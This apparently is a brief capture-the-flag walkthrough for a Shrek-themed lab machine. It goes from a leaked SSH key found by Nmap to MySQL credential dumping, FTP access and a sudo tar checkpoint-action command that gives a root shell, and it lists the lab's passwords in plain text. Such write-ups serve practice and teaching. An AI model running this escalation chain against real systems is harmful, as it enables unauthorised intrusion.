Nmap scan shows weird web directory /crxsdcdf.txt which has id_rsa for shrek

login as shrek with id_rsa, use linpeas.sh which shows mysql database password as "password"

mysql -u root -p 
show databases;
use api;
show tables;
SELECT * from users;

----+------+------------------+
| id | user | pass             |
+----+------+------------------+
|  4 | ftp  | EkRYje58bhFpg2uW |
+----+------+------------------+
login ftp with above creds, get message.txt which has donkey password as "J5rURvCa8DyTg3vR"

In user donkey:
	sudo -l shows tar

	sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh to get root shell